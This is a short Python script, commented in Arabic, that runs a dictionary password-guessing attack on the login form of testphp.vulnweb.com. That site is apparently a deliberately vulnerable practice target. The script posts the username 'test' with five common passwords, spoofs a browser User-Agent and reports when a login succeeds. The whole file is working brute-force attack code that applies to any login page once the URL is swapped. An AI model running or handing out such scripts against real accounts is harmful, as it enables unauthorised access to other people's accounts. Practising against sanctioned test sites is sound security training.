import requests
import time

# إعدادات للطلب
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
}

passwords = ["test", "admin", "password", "123456", "test123"]

for pwd in passwords:
    data = {'uname': 'test', 'pass': pwd}
    
    response = requests.post(
        "http://testphp.vulnweb.com/login.php",
        data=data,
        headers=headers
    )
    
    if "Logout" in response.text:
        print(f"🎯 Found! Username: test, Password: {pwd}")
        break
    else:
        print(f"Tried: {pwd} - Failed")
    
    time.sleep(1)
